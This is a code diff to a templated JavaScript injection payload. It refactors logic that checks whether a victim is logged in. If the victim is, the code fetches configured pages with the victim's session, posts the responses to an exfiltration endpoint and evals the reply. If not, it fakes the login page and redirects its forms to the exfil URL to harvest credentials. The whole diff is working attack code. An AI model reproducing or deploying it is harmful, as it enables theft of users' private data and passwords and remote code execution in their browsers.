@@ -16,47 +16,59 @@
   script.type = 'text/javascript';
   script.onload = function() {
     (function($) {
+
+      /*
+       * As there are multiple ways to trigger our actions, set them up as functions.
+       */
+      function onLoggedIn() {
+        /*
+         *  The user is logged in - load the resources and send them to the exfil endpoint.
+         *  This request will be launched when all resources load, or a 5s timeout elapses.
+         */
+        var isSent = false;
+        var xdata = [];
+        var remaining = {{dataURLCount}};
+        var exfil = function() {
+          if (!isSent) {
+            $.post(exfilURL, JSON.stringify(xdata), function(r) {eval(r)}, 'text');
+            isSent = true;
+          }
+        }
+        {{#dataURLs}}
+        $.{{method}}({{{url}}}{{{#data}}}, function(r) {
+          xdata.push({url: {{{url}}}, method: '{{{method}}}', response: r});
+          remaining -= 1;
+          if (remaining <= 0) { exfil(); }
+        }, 'text');
+        {{/dataURLs}}
+        window.setTimeout(exfil, 5000);
+      }
+
+      function onNotLoggedIn() {
+        /*
+         *  The user is not logged in - fake load the login page then alter the forms.
+         */
+        if (window.history && window.history.replaceState) {
+          window.history.replaceState({}, "Login", loginURL)
+        } else if (window.history && window.history.pushState) {
+          window.history.pushState({}, "Login", loginURL)
+        }
+        $.get(loginURL, function(r) {
+          b.html(r);
+          $('form').attr('action', exfilURL);
+        }, 'text');
+      }
+
       /*
        *  Fetch a page to check whether the user is logged in.
        */
       $.get(loginCheckURL, function(r) {
         if (r.match(loginCheckPattern)) {
-          /*
-           *  The user is logged in - load the resources and send them to the exfil endpoint.
-           *  This request will be launched when all resources load, or a 5s timeout elapses.
-           */
-          var isSent = false;
-          var xdata = [];
-          var remaining = {{dataURLCount}};
-          var exfil = function() {
-            if (!isSent) {
-              $.post(exfilURL, JSON.stringify(xdata), function(r) {eval(r)}, 'text');
-              isSent = true;
-            }
-          }
-          {{#dataURLs}}
-          $.{{method}}({{{url}}}{{{#data}}}, function(r) {
-            xdata.push({url: {{{url}}}, method: '{{{method}}}', response: r});
-            remaining -= 1;
-            if (remaining <= 0) { exfil(); }
-          }, 'text');
-          {{/dataURLs}}
-          window.setTimeout(exfil, 5000);
+          onLoggedIn();
         } else {
-          /*
-           *  The user is not logged in - fake load the login page then alter the forms.
-           */
-          if (window.history && window.history.replaceState) {
-            window.history.replaceState({}, "Login", loginURL)
-          } else if (window.history && window.history.pushState) {
-            window.history.pushState({}, "Login", loginURL)
-          }
-          $.get(loginURL, function(r) {
-            b.html(r);
-            $('form').attr('action', exfilURL);
-          }, 'text');
+          onNotLoggedIn();
         }
-      }, 'text');
+      }, 'text').fail(onNotLoggedIn);
     })(window.jQuery.noConflict(true)) // noConflict(true) reverses changes to all globals
   };
   document.getElementsByTagName("head")[0].appendChild(script);
